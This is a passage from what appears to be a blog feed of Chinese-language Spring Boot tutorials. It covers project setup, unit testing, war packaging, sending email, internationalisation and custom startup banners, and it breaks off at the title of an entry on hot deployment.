BeanDefinitionReader.class;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@ImportResource</code> 可以指定要导入的 XML 配置文件的路径，还能指定自定义的 <code>BeanDefinitionReader</code>。</p><p>来一个示例，导入一个类路径下的 XML 配置文件：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ImportResource(&quot;classpath:config&#x2F;spring-mvc.xml&quot;)public class MainConfiguration &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过本文的介绍，可以看出来 Spring Boot 现在对原有的 Spring MVC 传统项目是支持的非常好的，不管是 Servlet，还是 XML  配置文件，都可以轻松集成。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 功能实战</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8A%9F%E8%83%BD%E5%AE%9E%E6%88%98/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8A%9F%E8%83%BD%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="添加web功能启动器"><a href="#添加web功能启动器" class="headerlink" title="添加web功能启动器"></a>添加web功能启动器</h2><p>添加了Spring Boot基础依赖后，如要使用web mvc功能，只需要添加如下启动器即可，Spring Boot会自动装配web功能。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;    &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加启动类"><a href="#添加启动类" class="headerlink" title="添加启动类"></a>添加启动类</h2><p>然后添加启动类，建议放在根包下，这里把Controller和启动类放在一起也是没问题的，实际请分包出来。</p><p>启动类必须要有main方法，并添加启动方法。</p><pre class="line-numbers language-none"><code class="language-none">package hello;import org.springframework.boot.*;import org.springframework.boot.autoconfigure.*;import org.springframework.stereotype.*;import org.springframework.web.bind.annotation.*;@Controller@SpringBootApplicationpublic class SampleController &#123;    @RequestMapping(&quot;&#x2F;&quot;)    @ResponseBody    String home() &#123;        return &quot;Hello World!&quot;;    &#125;    public static void main(String[] args) throws Exception &#123;        SpringApplication.run(SampleController.class, args);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加编译打包插件"><a href="#添加编译打包插件" class="headerlink" title="添加编译打包插件"></a>添加编译打包插件</h2><pre class="line-numbers language-none"><code class="language-none">&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;&lt;executions&gt;&lt;execution&gt;&lt;goals&gt;&lt;goal&gt;repackage&lt;&#x2F;goal&gt;&lt;&#x2F;goals&gt;&lt;configuration&gt;&lt;classifier&gt;exec&lt;&#x2F;classifier&gt;&lt;fork&gt;true&lt;&#x2F;fork&gt;&lt;excludeDevtools&gt;true&lt;&#x2F;excludeDevtools&gt;&lt;&#x2F;configuration&gt;&lt;&#x2F;execution&gt;&lt;&#x2F;executions&gt;&lt;&#x2F;plugin&gt;&lt;&#x2F;plugins&gt;&lt;&#x2F;build&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运行Spring-Boot的3种方式"><a href="#运行Spring-Boot的3种方式" class="headerlink" title="运行Spring Boot的3种方式"></a>运行Spring Boot的3种方式</h2><ol><li>运行启动类的main方法。</li><li>使用spring-boot:run命令。</li><li>打成jar包后使用java -jar xx.jar命令。</li></ol><p>Spring Boot默认的端口是8080，可以通过server.port&#x3D;8081来修改，或者通过命令行指定也行。</p><p>启动工程后，访问localhost:8080&#x2F;就能输出：Hello World!</p><h2 id="Spring-Boot快速构建方式"><a href="#Spring-Boot快速构建方式" class="headerlink" title="Spring Boot快速构建方式"></a>Spring Boot快速构建方式</h2><p>上面是通过maven手动创建工程的方式添加Spring Boot应用 ，当然新手也可以打开Spring Boot的快速构建网站<a href="http://start.spring.io/%EF%BC%8C%E6%9D%A5%E9%80%89%E6%8B%A9%E5%AF%B9%E5%BA%94%E7%9A%84%E5%90%AF%E5%8A%A8%E5%99%A8%E7%94%9F%E6%88%90%E9%A1%B9%E7%9B%AE%EF%BC%8C%E6%9C%80%E5%90%8E%E5%AF%BC%E5%85%A5%E8%BF%9B%E6%9D%A5%E5%8D%B3%E5%8F%AF%E3%80%82">http://start.spring.io/，来选择对应的启动器生成项目，最后导入进来即可。</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 单元测试详解+实战教程</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E8%AF%A6%E8%A7%A3+%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E8%AF%A6%E8%A7%A3+%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="Spring-Boot-的测试类库"><a href="#Spring-Boot-的测试类库" class="headerlink" title="Spring Boot 的测试类库"></a>Spring Boot 的测试类库</h4><p>Spring Boot 提供了许多实用工具和注解来帮助测试应用程序，主要包括以下两个模块。</p><ul><li><p>spring-boot-test：支持测试的核心内容。</p></li><li><p>spring-boot-test-autoconfigure：支持测试的自动化配置。</p></li></ul><p>开发进行只要使用 <code>spring-boot-starter-test</code> 启动器就能引入这些 Spring Boot 测试模块，还能引入一些像 <code>JUnit, AssertJ, Hamcrest</code> 及其他一些有用的类库，具体如下所示。</p><ul><li>JUnit：Java 应用程序单元测试标准类库。</li><li>Spring Test &amp; Spring Boot Test：Spring Boot 应用程序功能集成化测试支持。</li><li>AssertJ：一个轻量级的断言类库。</li><li>Hamcrest：一个对象匹配器类库。</li><li>Mockito：一个Java Mock测试框架，默认支付 1.x，可以修改为 2.x。</li><li>JSONassert：一个用于JSON的断言库。</li><li>JsonPath：一个JSON操作类库。</li></ul><p>下面是 Maven 的依赖关系图。</p><p><img src="http://img.javastack.cn/18-3-20/39821255.jpg"></p><p>以上这些都是 Spring Boot 提供的一些比较常用的测试类库，如果上面的还不能满足你的需要，你也可以随意添加其他的以上没有的类库。</p><h4 id="测试-Spring-Boot-应用程序"><a href="#测试-Spring-Boot-应用程序" class="headerlink" title="测试 Spring Boot 应用程序"></a>测试 Spring Boot 应用程序</h4><p>添加 Maven 依赖</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.5.10.RELEASE&lt;&#x2F;version&gt;    &lt;scope&gt;test&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、 要让一个普通类变成一个单元测试类只需要在类名上加入 @SpringBootTest 和 @RunWith(SpringRunner.class) 两个注释即可。</p><p>2、 在测试方法上加上 @Test 注释。</p><p>如果测试需要做 REST 调用，可以 @Autowire 一个 TestRestTemplate。</p><pre class="line-numbers language-none"><code class="language-none">@RunWith(SpringRunner.class)@SpringBootTestpublic class BBTestAA &#123;   @Autowired   private TestRestTemplate testRestTemplate;      @Test   public void testDemo() &#123;    ...   ｝    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GET请求测试</p><pre class="line-numbers language-none"><code class="language-none">@Testpublic void get() throws Exception &#123;    Map&lt;String,String&gt; multiValueMap &#x3D; new HashMap&lt;&gt;();    multiValueMap.put(&quot;username&quot;,&quot;Java&quot;);    ActResult result &#x3D; testRestTemplate.getForObject(&quot;&#x2F;test&#x2F;getUser?username&#x3D;&#123;username&#125;&quot;,ActResult.class,multiValueMap);    Assert.assertEquals(result.getCode(),0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>POST请求测试</p><pre class="line-numbers language-none"><code class="language-none">@Testpublic void post() throws Exception &#123;    MultiValueMap multiValueMap &#x3D; new LinkedMultiValueMap();    multiValueMap.add(&quot;username&quot;,&quot;Java&quot;);    ActResult result &#x3D; testRestTemplate.postForObject(&quot;&#x2F;test&#x2F;post&quot;,multiValueMap,ActResult.class);    Assert.assertEquals(result.getCode(),0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件上传测试</p><pre class="line-numbers language-none"><code class="language-none">@Testpublic void upload() throws Exception &#123;    Resource resource &#x3D; new FileSystemResource(&quot;&#x2F;home&#x2F;javastack&#x2F;test.jar&quot;);    MultiValueMap multiValueMap &#x3D; new LinkedMultiValueMap();    multiValueMap.add(&quot;username&quot;,&quot;Java&quot;);    multiValueMap.add(&quot;files&quot;,resource);    ActResult result &#x3D; testRestTemplate.postForObject(&quot;&#x2F;test&#x2F;upload&quot;,multiValueMap,ActResult.class);    Assert.assertEquals(result.getCode(),0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件下载测试</p><pre class="line-numbers language-none"><code class="language-none">@Testpublic void download() throws Exception &#123;    HttpHeaders headers &#x3D; new HttpHeaders();    headers.set(&quot;token&quot;,&quot;javastack&quot;);    HttpEntity formEntity &#x3D; new HttpEntity(headers);    String[] urlVariables &#x3D; new String[]&#123;&quot;admin&quot;&#125;;    ResponseEntity&lt;byte[]&gt; response &#x3D; testRestTemplate.exchange(&quot;&#x2F;test&#x2F;download?username&#x3D;&#123;1&#125;&quot;,HttpMethod.GET,formEntity,byte[].class,urlVariables);    if (response.getStatusCode() &#x3D;&#x3D; HttpStatus.OK) &#123;        Files.write(response.getBody(),new File(&quot;&#x2F;home&#x2F;javastack&#x2F;test.jar&quot;));    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 发布将 jar 包转为 war 包</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8F%91%E5%B8%83%E5%B0%86%20jar%20%E5%8C%85%E8%BD%AC%E4%B8%BA%20war%20%E5%8C%85/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8F%91%E5%B8%83%E5%B0%86%20jar%20%E5%8C%85%E8%BD%AC%E4%B8%BA%20war%20%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><img src="http://qianniu.javastack.cn/18-2-27/88945925.jpg"></p><p>Spring Boot是支持发布jar包和war的，但它推荐的是使用jar形式发布。使用jar包比较方便，但如果是频繁修改更新的项目，需要打补丁包，那这么大的jar包上传都是问题。所以，jar包不一定合适适用所有的场景，如war包更合适，你可以尝试转为传统的war包，这样打补丁包可能更方便。</p><h4 id="如何配置打war包呢？"><a href="#如何配置打war包呢？" class="headerlink" title="如何配置打war包呢？"></a>如何配置打war包呢？</h4><p>以下配置以Maven为说明讲解，Gradle的查看类似配置。</p><p><strong>1、修改Spring Boot启动类</strong></p><p>启动类继承<code>SpringBootServletInitializer</code>类，并覆盖<code>configure</code>方法。</p><p>下面是Spring Boot提供的示例代码。</p><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class Application extends SpringBootServletInitializer &#123;@Overrideprotected SpringApplicationBuilder configure(SpringApplicationBuilder application) &#123;return application.sources(Application.class);&#125;public static void main(String[] args) throws Exception &#123;SpringApplication.run(Application.class, args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、修改jar为war包形式</strong></p><p>在pom文件中，添加war包配置。</p><pre class="line-numbers language-none"><code class="language-none">&lt;packaging&gt;war&lt;&#x2F;packaging&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不添加，默认为jar包。</p><p><strong>3、去除Spring Boot内置Tomcat</strong></p><p>修改自带tomcat依赖范围为provided，防止与外部tomcat发生冲突。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;<!-- … -->&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-tomcat&lt;&#x2F;artifactId&gt;&lt;scope&gt;provided&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;<!-- … -->&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4、添加war包打包插件</strong></p><p>如果你用的是继承spring-boot-starter-parent的形式使用Spring Boot，那可以跳过，因为它已经帮你配置好了。如果你使用的依赖spring-boot-dependencies形式，你需要添加以下插件。</p><pre class="line-numbers language-none"><code class="language-none">&lt;plugin&gt;    &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;maven-war-plugin&lt;&#x2F;artifactId&gt;    &lt;configuration&gt;        &lt;failOnMissingWebXml&gt;false&lt;&#x2F;failOnMissingWebXml&gt;    &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>failOnMissingWebXml需要开启为false，不然打包会报没有web.xml错误。</p></blockquote><h4 id="如何打war包？"><a href="#如何打war包？" class="headerlink" title="如何打war包？"></a>如何打war包？</h4><p>打war包方式和打jar包方式一样，没有区别。</p><ul><li><p>在Maven中使用<code>mvn clean package</code>命令即可打包。</p></li><li><p>在Idea中可以这样设置打包：</p></li></ul><p><img src="http://qianniu.javastack.cn/18-2-8/28070341.jpg"></p><p>改在war包后，发现打war包比打jar要上好多。</p><h4 id="jar包转war包有什么影响？"><a href="#jar包转war包有什么影响？" class="headerlink" title="jar包转war包有什么影响？"></a>jar包转war包有什么影响？</h4><p>1、application配置文件中的server.xx等关于容器的配置就无效了，改配置需要在外部tomcat中进行。</p><p>2、Spring Boot的升级是否需要Tomcat跟着升级？需要观察。</p><p>3、打war包比打jar明显要变慢好多。。</p><p>暂时还没遇到其他问题，大家对此有什么看法都可以在下方留言。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 发邮件，1 分钟教会你</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8F%91%E9%82%AE%E4%BB%B6%EF%BC%8C1%20%E5%88%86%E9%92%9F%E6%95%99%E4%BC%9A%E4%BD%A0/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%8F%91%E9%82%AE%E4%BB%B6%EF%BC%8C1%20%E5%88%86%E9%92%9F%E6%95%99%E4%BC%9A%E4%BD%A0/</url>
      
        <content type="html"><![CDATA[<p>Spring Boot 提供了一个发送邮件的简单抽象，使用的是下面这个接口。</p><blockquote><p>org.springframework.mail.javamail.JavaMailSender</p></blockquote><p>Spring Boot 提供了一个 <code>starter</code>，并能自动配置，下面来做个小例子，顺便解析它做了什么工作。</p><h3 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h3><p>在 Maven <code>pom.xml</code> 配置文件中加入 <code>spring-boot-starter-mail</code> 依赖。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;&lt;artifactId&gt;spring-boot-starter-mail&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、添加配置参数"><a href="#2、添加配置参数" class="headerlink" title="2、添加配置参数"></a>2、添加配置参数</h3><p>然后在 <code>application.properties</code> 文件中加入以下配置。</p><pre class="line-numbers language-none"><code class="language-none">spring.mail.host&#x3D;smtp.exmail.qq.comspring.mail.username&#x3D;admin@javastack.cnspring.mail.password&#x3D;123456# 启动SSL时的配置spring.mail.smtp.socketFactory.class&#x3D;javax.net.ssl.SSLSocketFactoryspring.mail.smtp.socketFactory.fallback&#x3D;falsespring.mail.smtp.socketFactory.port&#x3D;465<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、一个简单的发送邮件例子"><a href="#3、一个简单的发送邮件例子" class="headerlink" title="3、一个简单的发送邮件例子"></a>3、一个简单的发送邮件例子</h3><p>写一个控制器，写一个简单的发送邮件的小例子，发送成功返回 <code>true</code>，发送失败返回 <code>false</code>。</p><pre class="line-numbers language-none"><code class="language-none">@Autowiredprivate JavaMailSender javaMailSender;@RequestMapping(&quot;&#x2F;sendEmail&quot;)@ResponseBodypublic boolean sendEmail() &#123;SimpleMailMessage msg &#x3D; new SimpleMailMessage();msg.setFrom(&quot;admin@javastack.cn&quot;);msg.setBcc();msg.setTo(&quot;admin@javastack.cn&quot;);msg.setSubject(&quot;Java&quot;);msg.setText(&quot;技术分享&quot;);try &#123;javaMailSender.send(msg);&#125; catch (MailException ex) &#123;System.err.println(ex.getMessage());return false;&#125;return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、自动配置都做了什么？"><a href="#4、自动配置都做了什么？" class="headerlink" title="4、自动配置都做了什么？"></a>4、自动配置都做了什么？</h3><p>Spring Boot 发现类路径下有这个 <code>spring-boot-starter-mail</code> 包和 <code>spring.mail.host</code> 参数就会自动配置 <code>JavaMailSenderImpl</code>。</p><p>上面那些 <code>spring.mail.xx</code> 参数用来装配 <code>MailProperties</code> 这个类。</p><blockquote><p>org.springframework.boot.autoconfigure.mail.MailProperties</p></blockquote><p>自动配置类：</p><blockquote><p>org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration</p></blockquote><p><img src="http://img.javastack.cn/18-8-27/70236436.jpg"></p><blockquote><p>org.springframework.boot.autoconfigure.mail.MailSenderPropertiesConfiguration</p></blockquote><p><img src="http://img.javastack.cn/18-8-27/56485452.jpg"></p><p>其实就是用了上面装配的参数注册了一个 <code>JavaMailSenderImpl</code> 实例而已，然后你就可以注入使用了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 国际化支持</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%9B%BD%E9%99%85%E5%8C%96%E6%94%AF%E6%8C%81/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%9B%BD%E9%99%85%E5%8C%96%E6%94%AF%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>本章将讲解如何在Spring Boot和Thymeleaf中做页面模板国际化的支持，根据系统语言环境或者session中的语言来自动读取不同环境中的文字。</p><h2 id="国际化自动配置"><a href="#国际化自动配置" class="headerlink" title="国际化自动配置"></a>国际化自动配置</h2><p>Spring Boot中已经对国际化这一块做了自动配置。</p><p>国际化自动配置类：</p><blockquote><p>org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration</p></blockquote><p>查看自动配置源码有以下主要几个参数：</p><pre class="line-numbers language-none"><code class="language-none">private String basename &#x3D; &quot;messages&quot;;private Charset encoding &#x3D; Charset.forName(&quot;UTF-8&quot;);private int cacheSeconds &#x3D; -1;private boolean fallbackToSystemLocale &#x3D; true;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>basename</code>：默认的扫描的国际化文件名为messages，即在resources建立messages_xx.properties文件，可以通过逗号指定多个，如果不指定包名默认从classpath下寻找。</p><p><code>encoding</code>：默认的编码为UTF-8。</p><p><code>cacheSeconds</code>：加载国际化文件的缓存时间，单位为秒，默认为永久缓存。</p><p><code>fallbackToSystemLocale</code>：当找不到当前语言的资源文件时，如果为true默认找当前系统的语言对应的资源文件如messages_zh_CN.properties，如果为false即加载系统默认的如messages.properties文件。</p><h2 id="国际化实战"><a href="#国际化实战" class="headerlink" title="国际化实战"></a>国际化实战</h2><p>1、国际化配置</p><pre class="line-numbers language-none"><code class="language-none">spring:    messages:        fallbackToSystemLocale: false        basename: i18n&#x2F;common, i18n&#x2F;login, i18n&#x2F;index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、在i18n目录下创建以下几个文件</p><p>如index.properties,index_zh_CN.properties，index.properties作为找不到定义语言的资源文件时的默认配置文件。</p><p>创建对应的key&#x2F;value，如：</p><p>index_zh_CN.properties</p><pre class="line-numbers language-none"><code class="language-none">index.welcome&#x3D;欢迎<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>index.properties</p><pre class="line-numbers language-none"><code class="language-none">index.welcome&#x3D;welcome<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、添加语言解析器，并设置默认语言为US英文</p><p>LocaleResolver接口有许多实现，如可以从session、cookie、Accept-Language header、或者一个固定的值来判断当前的语言环境，下面是使用session来判断。</p><pre class="line-numbers language-none"><code class="language-none">@Beanpublic LocaleResolver localeResolver() &#123;SessionLocaleResolver sessionLocaleResolver &#x3D; new SessionLocaleResolver();sessionLocaleResolver.setDefaultLocale(Locale.US);return sessionLocaleResolver;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、添加切换语言过滤器</p><pre class="line-numbers language-none"><code class="language-none">private LocaleChangeInterceptor localeChangeInterceptor() &#123;LocaleChangeInterceptor localeChangeInterceptor &#x3D; new LocaleChangeInterceptor();localeChangeInterceptor.setParamName(&quot;lang&quot;);return localeChangeInterceptor;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加以上过滤器并注册到spring mvc中</p><pre class="line-numbers language-none"><code class="language-none">@Overridepublic void addInterceptors(InterceptorRegistry registry) &#123;    registry.addInterceptor(localeChangeInterceptor());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后页面通过访问指定的url?lang&#x3D;zh_CN进行切换。</p><p>5、通过<code>#{}</code>来读取资源文件</p><p>如Thymeleaf模板文件中使用：</p><pre class="line-numbers language-none"><code class="language-none">&lt;label th:text&#x3D;&quot;#&#123;index.welcome&#125;&quot;&gt;&lt;&#x2F;label&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认会读取英文的资源文件并显示：welcome</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 定制启动图案</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%AE%9A%E5%88%B6%E5%90%AF%E5%8A%A8%E5%9B%BE%E6%A1%88/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%AE%9A%E5%88%B6%E5%90%AF%E5%8A%A8%E5%9B%BE%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="启动图案"><a href="#启动图案" class="headerlink" title="启动图案"></a>启动图案</h2><p>Spring Boot在启动的时候会显示一个默认的Spring的图案，对应的类为SpringBootBanner。</p><pre class="line-numbers language-none"><code class="language-none">.   ____          _            __ _ _ &#x2F;\\ &#x2F; ___&#39;_ __ _ _(_)_ __  __ _ \ \ \ \( ( )\___ | &#39;_ | &#39;_| | &#39;_ \&#x2F; _&#96; | \ \ \ \ \\&#x2F;  ___)| |_)| | | | | || (_| |  ) ) ) )  &#39;  |____| .__|_| |_|_| |_\__, | &#x2F; &#x2F; &#x2F; &#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|_|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|___&#x2F;&#x3D;&#x2F;_&#x2F;_&#x2F;_&#x2F; :: Spring Boot ::        (v1.5.6.RELEASE)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>图案输出有以下几种模式，默认是CONSOLE的，即只打印到控制台，也可以输出到日志文件。</p><pre class="line-numbers language-none"><code class="language-none">enum Mode &#123;&#x2F;** * Disable printing of the banner. *&#x2F;OFF,&#x2F;** * Print the banner to System.out. *&#x2F;CONSOLE,&#x2F;** * Print the banner to the log file. *&#x2F;LOG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关闭图案"><a href="#关闭图案" class="headerlink" title="关闭图案"></a>关闭图案</h2><pre class="line-numbers language-none"><code class="language-none">@SpringBootApplicationpublic class Application &#123;public static void main(String[] args) &#123;new SpringApplicationBuilder(Application.class).bannerMode(Banner.Mode.OFF).run(args);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定制图案"><a href="#定制图案" class="headerlink" title="定制图案"></a>定制图案</h2><p>很简单，只要在classpath目录下创建banner.txt即可，把图案放入该文件就行，这是Spring Boot默认的图案位置，Spring Boot会自动加载该文件显示图案。</p><p>生成图案的网站：<a href="http://patorjk.com/">http://patorjk.com</a></p><p>也可以使用图片，更详细的可以研究Banner接口及其子类，不过这也没什么卵用，有兴趣的可以深入了解下。</p><p>当然也支持通过application配置文件来定制图案。</p><pre class="line-numbers language-none"><code class="language-none"># BANNERbanner.charset&#x3D;UTF-8 # Banner file encoding.banner.location&#x3D;classpath:banner.txt # Banner file location.banner.image.location&#x3D;classpath:banner.gif # Banner image file location (jpg&#x2F;png can also be used).banner.image.width&#x3D; # Width of the banner image in chars (default 76)banner.image.height&#x3D; # Height of the banner image in chars (default based on image height)banner.image.margin&#x3D; # Left hand image margin in chars (default 2)banner.image.invert&#x3D; # If images should be inverted for dark terminal themes (default false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 实现热部署</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E7%83%AD%E9%83%A8%E7%BD%B2/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E7%83%AD%E9%83%A8%E7%BD%B2/</url>
      
